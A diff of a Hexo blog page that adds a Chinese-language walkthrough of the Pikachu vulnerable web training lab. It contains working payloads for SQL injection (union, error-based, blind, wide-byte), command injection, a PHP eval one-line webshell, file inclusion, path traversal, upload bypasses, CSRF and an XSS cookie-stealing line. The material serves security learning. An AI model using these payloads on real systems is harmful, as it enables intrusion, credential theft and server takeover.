@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"Kali渗透Windows服务器","path":"2026/04/01/Kali渗透Windows服务器/"},{"title":"NSSCTF","path":"2026/03/21/NSSCTF/"},{"title":"PHP反序列化","path":"2026/04/06/PHP反序列化/"},{"title":"ISCTF 复现","path":"2026/01/16/ISCTF-复现/"},{"title":"SSTI","path":"2026/04/30/SSTI/"},{"title":"PHP命令执行","path":"2026/04/22/PHP命令执行/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"PHP伪协议","path":"2026/04/02/PHP伪协议/"},{"title":"ctfplus","path":"2026/03/17/ctfplus/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"php","path":"2025/10/05/php/"},{"title":"upload","path":"2026/01/25/upload/"},{"title":"sqlmap","path":"2026/03/30/sqlmap/"},{"title":"pikachu","path":"2026/07/09/pikachu/"},{"title":"web1","path":"2026/05/09/web1/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"},{"title":"极客大挑战2025 web复现","path":"2026/01/16/极客大挑战2025-web复现/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"文件包含","path":"2026/04/12/文件包含/"}]`)
+  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"ISCTF 复现","path":"2026/01/16/ISCTF-复现/"},{"title":"Kali渗透Windows服务器","path":"2026/04/01/Kali渗透Windows服务器/"},{"title":"NSSCTF","path":"2026/03/21/NSSCTF/"},{"title":"PHP伪协议","path":"2026/04/02/PHP伪协议/"},{"title":"PHP反序列化","path":"2026/04/06/PHP反序列化/"},{"title":"PHP命令执行","path":"2026/04/22/PHP命令执行/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"SSTI","path":"2026/04/30/SSTI/"},{"title":"ctfplus","path":"2026/03/17/ctfplus/"},{"title":"php","path":"2025/10/05/php/"},{"title":"pikachu","path":"2026/07/09/pikachu/"},{"title":"sqlmap","path":"2026/03/30/sqlmap/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"upload","path":"2026/01/25/upload/"},{"title":"web1","path":"2026/05/09/web1/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"文件包含","path":"2026/04/12/文件包含/"},{"title":"极客大挑战2025 web复现","path":"2026/01/16/极客大挑战2025-web复现/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>7277天</span>
+        <span>7280天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -458,7 +458,198 @@
 <p>查看提示输入tmac<br>查看源码<br>![p32](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p32.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p32.png）</a><br>用'tmac闭合<br>输入</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmac‘;alert(document.cookie)<span class="operator">/</span><span class="operator">/</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1></script></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>攻击者伪造一个请求，欺骗目标用户点击，用户点击请求，攻击完成</p>
+<h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录提示里面任意一个用户</p>
+<p>登录后显示个人信息，下面有个修改，将手机号修改成122222222222<br>![p33](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p33.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p33.png）</a></p>
+<p>用bp抓包，生成CSRF Poc代码（发送伪造请求）<br>![p34](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p34.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p34.png）</a><br>![p35](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p35.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p35.png）</a></p>
+<p>在浏览器打开URL<br>丢弃刚刚抓包的请求，手机号没有被修改<br>![p36](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p36.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p36.png）</a></p>
+<p>现在去点击页面出现的按钮，发现跳转到个人信息页，手机号被修改</p>
+<p>![p37](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p37.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p37.png）</a></p>
+<h1 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h1><p>与上一题相同，请求方式改变</p>
+<h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h1><p>bp抓包修改页面，发现会携带token一起发送，并且在当前页面生成新的token值</p>
+<p>![p38](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p38.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p38.png）</a></p>
+<p>需要使用CSRF Token Tracker(自动获取csrf的token，对于有csrf限制的请求，可以绕过限制)</p>
+<p>![p40](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p40.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p40.png）</a></p>
+<p>![p39](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p39.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p39.png）</a></p>
+<p>将数据包发到Repeater，修改手机号为1234567890<br>发送后页面出现重定向选项，点击</p>
+<p>![p41](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p41.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p41.png）</a></p>
+<p>手机号修改成功<br>![p42](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p42.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p42.png）</a></p>
+<h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><p>数据交互过程中，前端的数据传入到后台处理，没有做严格的判断，导致传入的数据拼接到SQL语句，被当作SQL语句的一部分执行。</p>
+<h1 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>正常显示</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>报错，说明是数字型</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>查询字段为2列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>查询表名users<br>![p43](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p43.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p43.png）</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>查询列名<br>![p44](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p44.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p44.png）</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+<p>获取到用户名和密码，密码需要md5解密<br>![p45](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p45.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p45.png）</a></p>
+<h1 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h1><p>尝试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>失败</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p>成功，说明是字符型</p>
+<p>其他过程同上</p>
+<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入1'出现以下报错信息，可以猜测代码闭合方式是%username%<br>![p46](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p46.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p46.png）</a><br>测试发现是字符型<br>于是输入<br>1%'#成功回显<br>其他部分同上，最后成功输出<br>![p47](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p47.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p47.png）</a></p>
+<h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>出现这行报错信息，说明是')闭合方式<br>1')#<br>![p48](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p48.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p48.png）</a><br>其余同上</p>
+<h1 id="insert-update-注入"><a href="#insert-update-注入" class="headerlink" title=""insert/update"注入"></a>"insert/update"注入</h1><p>updatexml():改变（查找并替换）XML文档中符合条件的节点的值<br>语法格式：updatexml(字段名，字符串，替换条件)<br>substr()用来分段截取，updatexml()只回显32个字符，<br>语法格式：substr(字符串，起始位置，截取长度)<br>extractvalue()与updatexml()相似<br>语法格式：extractvalue(字段名，字符串)</p>
+<p>在注册页面的地址输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+<p>出现报错注入，‘~pikachu’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema=database(),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+<p>出现表名 '~httpinfo,member,message,users,x...'</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>出现列名'~Host,User,Select_priv,Insert_pr...'</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="keyword">user</span><span class="string">&#x27;)),1,30),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>查询信息'~id,userid,ipaddress,useragent...'</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,substr(concat(0x7e,(select group_concat(username,password) from users)),1,30),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>对留言进行删除时抓包，发送到重放，在id处进行报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>![p49](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p49.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p49.png）</a><br>右键进行URL编码，其他其他步骤同上</p>
+<h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><p>后台开发人员为了验证客户端头信息或者通过http header头信息获取客户端的一些信息，会对客户端的http header信息进行获取并使用SQL进行处理，如果没有足够的安全考虑，会产生漏洞。<br>![p50](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p50.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p50.png）</a></p>
+<p>发送到重放，agent修改为'<br>![p51](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p51.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p51.png）</a><br>结果回显出信息，判断为报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+<p>![p52](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p52.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p52.png）</a></p>
+<p>剩余过程同上</p>
+<h1 id="盲注（base-on-boolian）"><a href="#盲注（base-on-boolian）" class="headerlink" title="盲注（base on boolian）"></a>盲注（base on boolian）</h1><p>页面回显只有两种情况</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and ascii(substr(database(),2,1))&gt;113#</span></span><br></pre></td></tr></table></figure>
+
+<p>不断替换<br>最后得出所有字母</p>
+<h1 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h1><p>根据后台确认的时间，确认注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and if((substr(database(),1,1))=&#x27;</span>p<span class="string">&#x27;,sleep(5),null)#</span></span><br></pre></td></tr></table></figure>
+<p>如果substr(database(),1,1))='p'正确则sleep(5)<br>如果错误则null<br>判断是否正确</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>通过编码绕过后端代码的防御措施，例如正则过滤和转义函数转义。</p>
+<p>使用场景：网站用 addslashes() 防御 SQL 注入，会把你输入的单引号 ' 转义成 &#39;，单引号失效，没法闭合 SQL 语句注入。</p>
+<p>客户端采用GBK编码格式，数据库对用户输入进行转义\，转义符\的编码是%5c，添加编码%df，组成%df%5c，识别成一个生僻汉字，绕过转义符让‘逃逸，反斜杠\直接被 “吃掉、消失”，最后只剩单独的 '，成功闭合 SQL 语句，注入生效</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p>出现‘您输入的username不存在，请重新输入！’</p>
+<p>bp抓包，输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
+<p>可正常注入</p>
+<p>![p53](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p53.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p53.png）</a></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>远程系统命令执行</p>
+<p>后端直接把用户可控输入拼接进系统命令，没有过滤 / 转义，攻击者可以插入命令分隔符，额外执行任意系统指令,可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p>应用系统从设计上需要给用户提供指定的远程命令操作的接口，会给用户一个ping操作的web界面，用户从该界面输入目标IP，提交后后台对该IP地址进行一次ping测试，返回结果。</p>
+<p>命令分隔符</p>
+<p>Windows / Linux 通用<br>; 分号：无论前命令成功失败，两条命令都执行<br>127.0.0.1;whoami</p>
+<p>| 管道符：把前命令输出交给后命令，强制执行后面指令<br>127.0.0.1|whoami</p>
+<p>逻辑判断符</p>
+<p>&&：前命令执行成功，才执行后面<br>127.0.0.1&&whoami </p>
+<p>||：前命令执行失败，才执行后面<br>127.0.0.1||whoami</p>
+<p>Linux 独有</p>
+<p>& 后台运行、$() 命令嵌套、<code>反引号</code> 嵌套执行<br>127.0.0.1$(whoami)</p>
+<h1 id="exec-ping"><a href="#exec-ping" class="headerlink" title="exec "ping""></a>exec "ping"</h1><p>先尝试输入127.0.0.1，可以正常返回结果。</p>
+<p>![p54](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p54.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p54.png）</a></p>
+<p>接下来利用漏洞尝试拼接命令</p>
+<p>127.0.0.1&&whoami</p>
+<p>![p55](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p55.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p55.png）</a></p>
+<p>127.0.0.1&&dir<br>列出当前目录所有文件</p>
+<p>![p56](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p56.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p56.png）</a></p>
+<h1 id="exec-eval"><a href="#exec-eval" class="headerlink" title="exec "eval""></a>exec "eval"</h1><p>远程代码执行</p>
+<p>eval() 会把传入的字符串直接当成 PHP 代码解析运行，用户输入无过滤，可控输入直接丢进 eval，造成任意 PHP 代码执行漏洞。</p>
+<p>直接用eval执行了post传递的txt值</p>
+<p>输入phpinfo();</p>
+<p>![p57](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p57.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p57.png）</a></p>
+<p>输入system('whoami');</p>
+<p>![p58](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p58.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p58.png）</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>创建木马文件，用蚁剑连接<br>![p59](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p59.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p59.png）</a><br>![p60](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p60.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p60.png）</a></p>
+<h2 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h2><p>文件包含函数：include(),include_once(),require(),require_once()<br>文件包含的代码文件被写成了一个变量，变量由前端客户传进来，让文件包含函数去执行，造成恶意1操作</p>
+<p>1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，通常情况攻击者会包含固定的系统配置文件，读取系统敏感信息。</p>
+<p>2.远程文件包含漏洞：通过URL地址对远程的文件进行包含，攻击者可以传入任意的代码</p>
+<h1 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h1><p>访问本地include文件里面的file1.php文件，直接修改URL</p>
+<p>![p61](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p61.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p61.png）</a></p>
+<p>创建一个文件php.txt，访问文件可得</p>
+<p>![p62](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p62.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p62.png）</a><br>![p63](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p63.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p63.png）</a></p>
+<p>如果php.txt文件放在pikachu文件下，可以访问../../../php.txt</p>
+<h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1><p>直接访问百度页面，<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a><br>![p64](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p64.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p64.png）</a></p>
+<h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>后台收到请求下载的文件名直接拼接进下载文件的路径不对其进行安全判断，就会引发不安全的文件下载漏洞。<br>所有与前端交互的数据都是不安全的！</p>
+<p>随机下载一个图片，用bp进行拦截，修改文件为../../../index.php,可以下载到index.php文件<br>![p65](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p65.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p65.png）</a><br>![p66](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p66.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p66.png）</a></p>
+<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><p>不安全文件上传漏洞</p>
+<p>后台对上传的文件没有安全判断或判断条件不严谨，用户可能上传恶意文件，比如一句话木马导致后台服务器被webshell</p>
+<p>文件上传时，要对传进来的文件进行严格的安全考虑：文件类型、后缀名、大小、文件上传方式、对文件重命名、不暴露文件上传路径</p>
+<h1 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h1><p>点开源代码，发现前端校验，只允许顺序jpg、png、gif为扩展名的文件上传</p>
+<p>![p67](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p67.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p67.png）</a></p>
+<p>方法一：</p>
+<p>可以直接在网页禁用JS然后进行上传</p>
+<p>![p68](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p68.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p68.png）</a></p>
+<p>上传一个木马文件</p>
+<p>![p69](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p69.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p69.png）</a></p>
+<p>![p70](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p70.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p70.png）</a></p>
+<p>用蚁剑连接</p>
+<p>![p72](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p72.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p72.png）</a><br>![p71](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p71.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p71.png）</a></p>
+<p>方法二：</p>
+<p>先上传符合文件扩展名要求的文件，之后bp抓包，bp里面修改为扩展名为php</p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>bp抓包，将Content-Type类型改为image/png</p>
+<p>![p73](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p73.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p73.png）</a></p>
+<p>用蚁剑连接</p>
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>getimagesize()是一个内置函数，用于获取图像大小，返回结果有文件大小和文件类型，用这个函数来获取类型，从而判断是否是图片会出现问题。</p>
+<p>尝试bp抓包修改Content-Type，显示后缀名不为空，因此服务器将不为三种类型的后缀都删除了</p>
+<p>![p74](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p74.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p74.png）</a></p>
+<p>将文件后缀改为jpeg，显示这是假图片，说明对文件内容进行检测</p>
+<p>在文件前加上图片文件头，还是被检测出来，说明不光检测了文件头</p>
+<p>因此需要尝试图片马</p>
+<p>![p75](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p75.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p75.png）</a></p>
+<p>成功上传，访问这个图片但是一句话木马没有执行，这时候要结合本地文件漏洞。</p>
+<p>![p76](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p76.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p76.png）</a></p>
+<p>在文件包含漏洞访问，之后用蚁剑连接</p>
+<p>![p77](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p77.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p77.png）</a></p>
+<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><p>如果使用A对权限去操作B用户的数据，A权限小于B，如果可以成功称为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p>
+<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>根据提示登录lucy的账号</p>
+<p>![p78](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p78.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p78.png）</a></p>
+<p>将url中的lucy改成lili，可以直接进入到lili到账号</p>
+<p>![p79](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p79.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p79.png）</a></p>
+<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>先登录pikachu账号</p>
+<p>![p80](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p80.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p80.png）</a></p>
+<p>再登录admin</p>
+<p>![p81](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p81.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p81.png）</a></p>
+<p>发现admin多了添加、删除的权限</p>
+<p>复制URL</p>
+<p>返回登录pikachu账号，直接将刚刚复制的URL粘贴进来，发现可以直接访问到admin</p>
+<h2 id=""><a href="#" class="headerlink" title="../../"></a>../../</h2><p>将需要访问的文件定义成变量，如果后台没有对前端传来的值进行严格的安全考虑，攻击者通过../的手段让后台执行一些其他文件，导致后台服务器上其他目录文件被遍历出来，形成目录遍历漏洞。</p>
+<p>如果通过不带参数的url列出了doc文件夹里面所有文件，成为敏感信息泄露。</p>
+<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p>发现URL出现参数，修改参数可以进行目录遍历</p>
+<p>![p82](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p82.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p82.png）</a><br>![p83](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p83.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p83.png）</a></p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>后台工作人员疏忽或者不当的设计，导致不应该被前端用户看见的数据轻易被访问到</p>
+<h1 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h1><p>查看前端代码，发现有测试账号的信息，可以直接登录</p>
+<p>![p84](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p84.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p84.png）</a></p>
